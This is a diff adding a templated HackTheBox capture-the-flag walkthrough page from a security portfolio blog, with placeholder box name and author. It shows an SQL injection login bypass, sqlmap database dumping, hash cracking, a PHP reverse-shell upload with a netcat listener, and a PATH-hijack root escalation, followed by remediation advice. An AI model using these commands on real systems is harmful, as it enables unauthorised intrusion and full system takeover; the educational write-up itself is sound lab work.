@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - [Box Name] Writeup | Daniel Mwangi Cybersecurity Professional</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="HackTheBox - [Box Name] Writeup" />
+<meta name="author" content="Your Name" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overview" />
+<meta property="og:description" content="Overview" />
+<link rel="canonical" href="http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/" />
+<meta property="og:url" content="http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/" />
+<meta property="og:site_name" content="Daniel Mwangi Cybersecurity Professional" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-01-15T13:00:00+03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - [Box Name] Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Your Name"},"dateModified":"2025-01-15T13:00:00+03:00","datePublished":"2025-01-15T13:00:00+03:00","description":"Overview","headline":"HackTheBox - [Box Name] Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/"},"url":"http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/">
+  
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="/assets/images/favicon.png">
+  
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+  
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Daniel Mwangi | Cybersecurity Professional" />
+  
+  
+</head>
+
+<body>
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+      <div class="site-title">
+        <a href="/">
+          <span class="terminal-prompt">root@portfolio:~$</span>
+          <span class="cursor">_</span>
+        </a>
+      </div>
+      
+      <button class="mobile-menu-toggle" aria-label="Toggle menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      
+      <nav class="main-nav">
+        <ul>
+          
+          <li>
+            <a href="/" 
+               >
+              Home
+            </a>
+          </li>
+          
+          <li>
+            <a href="/about/" 
+               >
+              About
+            </a>
+          </li>
+          
+          <li>
+            <a href="/projects/" 
+               >
+              Projects
+            </a>
+          </li>
+          
+          <li>
+            <a href="/blog/" 
+               >
+              Blog
+            </a>
+          </li>
+          
+          <li>
+            <a href="/certifications/" 
+               >
+              Certifications
+            </a>
+          </li>
+          
+          <li>
+            <a href="/contact/" 
+               >
+              Contact
+            </a>
+          </li>
+          
+        </ul>
+      </nav>
+      
+      <div class="social-links">
+        
+        <a href="https://github.com/gatiella" 
+           target="_blank" 
+           rel="noopener noreferrer"
+           aria-label="GitHub">
+          
+            <i class="fab fa-github"></i>
+          
+        </a>
+        
+        <a href="https://linkedin.com/in/gatiella" 
+           target="_blank" 
+           rel="noopener noreferrer"
+           aria-label="LinkedIn">
+          
+            <i class="fab fa-linkedin"></i>
+          
+        </a>
+        
+        <a href="https://twitter.com/danielmwangi" 
+           target="_blank" 
+           rel="noopener noreferrer"
+           aria-label="Twitter">
+          
+            <i class="fab fa-twitter"></i>
+          
+        </a>
+        
+        <a href="https://app.hackthebox.com/profile/gatiella" 
+           target="_blank" 
+           rel="noopener noreferrer"
+           aria-label="HackTheBox">
+          
+            <i class="fas fa-cube"></i>
+          
+        </a>
+        
+        <a href="https://tryhackme.com/p/gatiella" 
+           target="_blank" 
+           rel="noopener noreferrer"
+           aria-label="TryHackMe">
+          
+            <i class="fas fa-shield-alt"></i>
+          
+        </a>
+        
+      </div>
+    </div>
+  </div>
+  
+  <!-- Mobile menu -->
+  <div class="mobile-menu">
+    <nav>
+      <ul>
+        
+        <li>
+          <a href="/">Home</a>
+        </li>
+        
+        <li>
+          <a href="/about/">About</a>
+        </li>
+        
+        <li>
+          <a href="/projects/">Projects</a>
+        </li>
+        
+        <li>
+          <a href="/blog/">Blog</a>
+        </li>
+        
+        <li>
+          <a href="/certifications/">Certifications</a>
+        </li>
+        
+        <li>
+          <a href="/contact/">Contact</a>
+        </li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+  <main class="page-content" aria-label="Content">
+    <div class="wrapper">
+      <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">
+      <span class="terminal-prompt">$</span> HackTheBox - [Box Name] Writeup
+    </h1>
+    
+    <div class="post-meta">
+      <time class="dt-published" datetime="2025-01-15T13:00:00+03:00" itemprop="datePublished">
+        <i class="far fa-calendar"></i>
+        January 15, 2025
+      </time>
+      
+      
+      <span class="post-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <i class="far fa-user"></i>
+        <span itemprop="name">Your Name</span>
+      </span>
+      
+      
+      
+      <span class="reading-time">
+        <i class="far fa-clock"></i>
+        15 min read
+      </span>
+      
+      
+      
+      <span class="post-categories">
+        <i class="fas fa-folder"></i>
+        
+          <a href="/categories/ctf">CTF</a>, 
+        
+          <a href="/categories/hackthebox">HackTheBox</a>
+        
+      </span>
+      
+    </div>
+    
+    
+    <div class="post-tags">
+      
+      <span class="tag">
+        <i class="fas fa-tag"></i>
+        web exploitation
+      </span>
+      
+      <span class="tag">
+        <i class="fas fa-tag"></i>
+        privilege escalation
+      </span>
+      
+      <span class="tag">
+        <i class="fas fa-tag"></i>
+        linux
+      </span>
+      
+      <span class="tag">
+        <i class="fas fa-tag"></i>
+        python
+      </span>
+      
+    </div>
+    
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h2 id="overview">Overview</h2>
+
+<p><strong>Box Name</strong>: [Box Name]<br />
+<strong>Difficulty</strong>: Medium<br />
+<strong>OS</strong>: Linux<br />
+<strong>IP</strong>: 10.10.10.xxx<br />
+<strong>Release Date</strong>: January 2025</p>
+
+<h2 id="summary">Summary</h2>
+
+<p>This box involves exploiting a vulnerable web application with SQL injection to gain initial access, followed by exploiting a misconfigured SUID binary for privilege escalation to root.</p>
+
+<h3 id="skills-required">Skills Required</h3>
+<ul>
+  <li>Web application enumeration</li>
+  <li>SQL injection</li>
+  <li>Linux privilege escalation</li>
+  <li>Binary analysis</li>
+</ul>
+
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+  <li>Advanced SQLi techniques</li>
+  <li>Custom exploit development</li>
+  <li>SUID exploitation</li>
+</ul>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>Starting with a full port scan:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-oN</span> nmap/full 10.10.10.xxx
+</code></pre></div></div>
+
+<p><strong>Results:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.41
+3306/tcp open  mysql   MySQL 5.7.33
+</code></pre></div></div>
+
+<p>Key findings:</p>
+<ul>
+  <li>SSH on port 22 (likely for final access)</li>
+  <li>Apache web server on port 80</li>
+  <li>MySQL database on port 3306</li>
+</ul>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the website reveals a login portal:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.xxx <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre></div></div>
+
+<p><strong>Interesting directories found:</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/admin</code> - Admin panel (403 Forbidden)</li>
+  <li><code class="language-plaintext highlighter-rouge">/uploads</code> - File upload directory</li>
+  <li><code class="language-plaintext highlighter-rouge">/api</code> - API endpoints</li>
+  <li><code class="language-plaintext highlighter-rouge">/backup</code> - Backup files</li>
+</ul>
+
+<hr />
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<h3 id="sql-injection-discovery">SQL Injection Discovery</h3>
+
+<p>Testing the login form for SQL injection:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Username</span><span class="p">:</span> <span class="k">admin</span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+<span class="n">Password</span><span class="p">:</span> <span class="n">anything</span>
+</code></pre></div></div>
+
+<p>Response indicates SQL injection vulnerability!</p>
+
+<h3 id="exploiting-sqli">Exploiting SQLi</h3>
+
+<p>Using sqlmap to dump the database:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.xxx/login.php"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"username=admin&amp;password=test"</span> <span class="nt">--dbs</span>
+</code></pre></div></div>
+
+<p><strong>Databases found:</strong></p>
+<ul>
+  <li>information_schema</li>
+  <li>webapp_db</li>
+  <li>mysql</li>
+</ul>
+
+<p>Dumping credentials from webapp_db:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.xxx/login.php"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"username=admin&amp;password=test"</span> <span class="nt">-D</span> webapp_db <span class="nt">--tables</span>
+</code></pre></div></div>
+
+<p><strong>Table: users</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+|  2 | john     | 098f6bcd4621d373cade4e832627b4f6 |
++----+----------+----------------------------------+
+</code></pre></div></div>
+
+<p>Cracking the password hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"5f4dcc3b5aa765d61d8327deb882cf99"</span> <span class="o">&gt;</span> hash.txt
+john <span class="nt">--format</span><span class="o">=</span>Raw-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div></div>
+
+<p><strong>Result</strong>: <code class="language-plaintext highlighter-rouge">password</code></p>
+
+<h3 id="getting-shell-access">Getting Shell Access</h3>
+
+<p>With admin credentials, we can access the admin panel at <code class="language-plaintext highlighter-rouge">/admin</code>.</p>
+
+<p>Found file upload functionality. Testing for unrestricted file upload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create PHP reverse shell</span>
+<span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
+<span class="c"># Edit IP and PORT</span>
+
+<span class="c"># Upload file</span>
+curl <span class="nt">-X</span> POST <span class="nt">-F</span> <span class="s2">"file=@shell.php"</span> http://10.10.10.xxx/admin/upload.php <span class="nt">--cookie</span> <span class="s2">"session=admin_token"</span>
+</code></pre></div></div>
+
+<p>Start listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<p>Trigger shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.xxx/uploads/shell.php
+</code></pre></div></div>
+
+<p><strong>We have a shell as www-data!</strong></p>
+
+<hr />
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Checking for SUID binaries:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><strong>Interesting finding:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/custom_backup
+</code></pre></div></div>
+
+<p>Analyzing the binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /usr/bin/custom_backup
+</code></pre></div></div>
+
+<p>Output shows:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/tar -czf /tmp/backup.tar.gz /var/www/html
+</code></pre></div></div>
+
+<p>The binary uses <code class="language-plaintext highlighter-rouge">tar</code> without full path - potential PATH hijacking!</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Creating malicious tar:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+<span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> <span class="nb">tar
+echo</span> <span class="s1">'chmod +s /bin/bash'</span> <span class="o">&gt;&gt;</span> <span class="nb">tar
+chmod</span> +x <span class="nb">tar
+export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</code></pre></div></div>
+
+<p>Execute the SUID binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/custom_backup
+</code></pre></div></div>
+
+<p>Get root shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-p</span>
+<span class="nb">whoami</span>  <span class="c"># root!</span>
+</code></pre></div></div>
+
+<h3 id="capturing-flags">Capturing Flags</h3>
+
+<p><strong>User flag:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/john/user.txt
+<span class="o">[</span>user_flag_here]
+</code></pre></div></div>
+
+<p><strong>Root flag:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
+<span class="o">[</span>root_flag_here]
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ol>
+  <li><strong>Always test for SQL injection</strong> in login forms and input fields</li>
+  <li><strong>File upload vulnerabilities</strong> can provide easy initial access</li>
+  <li><strong>SUID binaries</strong> are common privilege escalation vectors</li>
+  <li><strong>PATH hijacking</strong> works when binaries don’t use absolute paths</li>
+  <li><strong>Enumeration is crucial</strong> - thorough scanning reveals opportunities</li>
+</ol>
+
+<hr />
+
+<h2 id="remediation">Remediation</h2>
+
+<h3 id="for-sql-injection">For SQL Injection:</h3>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Use prepared statements</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username = ? AND password = ?"</span><span class="p">);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="for-file-upload">For File Upload:</h3>
+<ul>
+  <li>Implement whitelist of allowed file extensions</li>
+  <li>Validate file content, not just extension</li>
+  <li>Store uploads outside web root</li>
+  <li>Randomize filenames</li>
+</ul>
+
+<h3 id="for-suid-binary">For SUID Binary:</h3>
+<ul>
+  <li>Use absolute paths in scripts</li>
+  <li>Minimize SUID binaries</li>
+  <li>Regular security audits</li>
+</ul>
+
+<hr />
+
+<h2 id="tools-used">Tools Used</h2>
+
+<ul>
+  <li>Nmap</li>
+  <li>Gobuster</li>
+  <li>SQLMap</li>
+  <li>Burp Suite</li>
+  <li>John the Ripper</li>
+  <li>Netcat</li>
+</ul>
+
+<hr />
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
+  <li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
+  <li><a href="https://book.hacktricks.xyz/">HackTricks</a></li>
+</ul>
+
+<hr />
+
+<p><strong>Box Difficulty</strong>: ⭐⭐⭐☆☆<br />
+<strong>Enjoyment</strong>: ⭐⭐⭐⭐☆<br />
+<strong>Learning Value</strong>: ⭐⭐⭐⭐⭐</p>
+
+<p><em>This writeup was created for educational purposes only.</em></p>
+
+  </div>
+
+  <footer class="post-footer">
+    
+
+    <!-- Share buttons -->
+    <div class="share-buttons">
+      <h3>Share this post:</h3>
+      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20[Box%20Name]%20Writeup&url=http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/" 
+         target="_blank" 
+         class="share-btn twitter"
+         aria-label="Share on Twitter">
+        <i class="fab fa-twitter"></i>
+      </a>
+      <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/" 
+         target="_blank" 
+         class="share-btn linkedin"
+         aria-label="Share on LinkedIn">
+        <i class="fab fa-linkedin"></i>
+      </a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/" 
+         target="_blank" 
+         class="share-btn facebook"
+         aria-label="Share on Facebook">
+        <i class="fab fa-facebook"></i>
+      </a>
+      <a href="https://reddit.com/submit?url=http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/&title=HackTheBox%20-%20[Box%20Name]%20Writeup" 
+         target="_blank" 
+         class="share-btn reddit"
+         aria-label="Share on Reddit">
+        <i class="fab fa-reddit"></i>
+      </a>
+    </div>
+
+    <!-- Navigation between posts -->
+    <nav class="post-navigation">
+      
+      
+      
+      <a href="/blog/2025/02/01/building-custom-pentest-toolkit/" class="next-post">
+        <span class="nav-label">Next Post →</span>
+        <span class="nav-title">Building Your Custom Penetration Testing Toolkit</span>
+      </a>
+      
+    </nav>
+  </footer>
+</article>
+
+<!-- Related posts -->
+
+<aside class="related-posts">
+  <h2>Related Posts</h2>
+  <div class="related-posts-grid">
+    
+    <article class="related-post-card">
+      <h3><a href="/blog/2025/02/01/building-custom-pentest-toolkit/">Building Your Custom Penetration Testing Toolkit</a></h3>
+      <p class="post-meta">February 01, 2025</p>
+      <p>Introduction
+</p>
+    </article>
+    
+  </div>
+</aside>
+
+    </div>
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-section">
+        <h3>Daniel Mwangi | Cybersecurity Professional</h3>
+        <p>Cybersecurity Engineer | Software Developer | Network Security Specialist</p>
+      </div>
+      
+      <div class="footer-section">
+        <h3>Quick Links</h3>
+        <ul>
+          
+          <li><a href="/">Home</a></li>
+          
+          <li><a href="/about/">About</a></li>
+          
+          <li><a href="/projects/">Projects</a></li>
+          
+          <li><a href="/blog/">Blog</a></li>
+          
+          <li><a href="/certifications/">Certifications</a></li>
+          
+          <li><a href="/contact/">Contact</a></li>
+          
+        </ul>
+      </div>
+      
+      <div class="footer-section">
+        <h3>Connect</h3>
+        <div class="footer-social">
+          
+          <a href="https://github.com/gatiella" 
+             target="_blank" 
+             rel="noopener noreferrer"
+             aria-label="GitHub">
+            
+              <i class="fab fa-github"></i>
+            
+          </a>
+          
+          <a href="https://linkedin.com/in/gatiella" 
+             target="_blank" 
+             rel="noopener noreferrer"
+             aria-label="LinkedIn">
+            
+              <i class="fab fa-linkedin"></i>
+            
+          </a>
+          
+          <a href="https://twitter.com/danielmwangi" 
+             target="_blank" 
+             rel="noopener noreferrer"
+             aria-label="Twitter">
+            
+              <i class="fab fa-twitter"></i>
+            
+          </a>
+          
+          <a href="https://app.hackthebox.com/profile/gatiella" 
+             target="_blank" 
+             rel="noopener noreferrer"
+             aria-label="HackTheBox">
+            
+              <i class="fas fa-cube"></i>
+            
+          </a>
+          
+          <a href="https://tryhackme.com/p/gatiella" 
+             target="_blank" 
+             rel="noopener noreferrer"
+             aria-label="TryHackMe">
+            
+              <i class="fas fa-shield-alt"></i>
+            
+          </a>
+          
+        </div>
+      </div>
+      
+      <div class="footer-section">
+        <h3>Latest Posts</h3>
+        <ul>
+          
+          <li>
+            <a href="/blog/2025/02/01/building-custom-pentest-toolkit/">Building Your Custom Penetration Testing Toolkit</a>
+          </li>
+          
+          <li>
+            <a href="/blog/2025/01/15/hackthebox-writeup-example/">HackTheBox - [Box Name] Writeup</a>
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <p>&copy; 2025 Daniel Mwangi. All rights reserved.</p>
+      <p class="terminal-text">
+        <span class="prompt">$</span> whoami && echo "Cybersecurity Professional"
+      </p>
+    </div>
+  </div>
+</footer>
+
+  <script src="/assets/js/main.js"></script>
+  <script src="/assets/js/terminal.js"></script>
+  
+  <!-- Back to top button -->
+  <button id="back-to-top" aria-label="Back to top">
+    <i class="fas fa-chevron-up"></i>
+  </button>
+
+  <!-- Matrix rain canvas (optional) -->
+  <canvas id="matrix-canvas"></canvas>
+</body>
+
+</html>
